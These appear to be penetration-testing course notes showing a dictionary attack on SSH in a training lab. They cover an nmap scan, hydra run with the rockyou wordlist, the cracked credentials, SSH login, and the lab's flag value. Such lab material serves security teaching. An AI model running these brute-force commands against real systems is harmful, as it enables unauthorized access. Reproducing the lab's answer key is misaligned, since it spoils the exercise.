# SSH

Checking if target is running a SSH service
>``` shell
>kali@kali:~$ sudo nmap -sV -p 2222 192.168.50.201
>
># ========== Expected Result ==========
>...
>PORT   STATE SERVICE
>2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
>...
># =====================================
>```

Unzipping Gzip Archive and attacking SSH
>``` shell
>kali@kali:~$ cd /usr/share/wordlists/
>
>kali@kali:~$ ls
>
># ========== Expected Result ==========
>dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt.gz  wfuzz
># =====================================
>
>kali@kali:~$ sudo gzip -d rockyou.txt.gz
>
>kali@kali:~$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
>
># ========== Expected Result ==========
>...
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
>[DATA] attacking ssh://192.168.50.201:22/
>[2222][ssh] host: 192.168.50.201   login: george   password: chocolate
>1 of 1 target successfully completed, 1 valid password found
>...
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on Password Attacks - SSH - VM #1. Find the flag in the george user's home directory.
>``` shell
># 1) Navigate to the default wordlists directory on Kali
>kali@kali:~$ cd /usr/share/wordlists/
>
># 2) Decompress the RockYou wordlist so it can be used for password attacks
>kali@kali:~$ sudo gzip -d rockyou.txt.gz
>
># 3) Perform a dictionary attack against the SSH service on port 2222 (-l specifies the username, -P specifies the password list, -s specifies the non-default SSH port)
>kali@kali:~$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.123.201
>
># 4) Log in to the target system via SSH using the discovered credentials
>kali@kali:~$ ssh george@192.168.123.201 -p 2222
>
># 5) Confirm the current working directory after logging in
>george@83fe940bd7cf:~$ pwd
>
># 6) List files in the user's home directory to locate the flag
>george@83fe940bd7cf:~$ ls
>
># 7) Display the contents of the flag file to complete the lab
>george@83fe940bd7cf:~$ cat flag.txt
>```
>OS{a84f7931068060b66d4893e0758f5960}
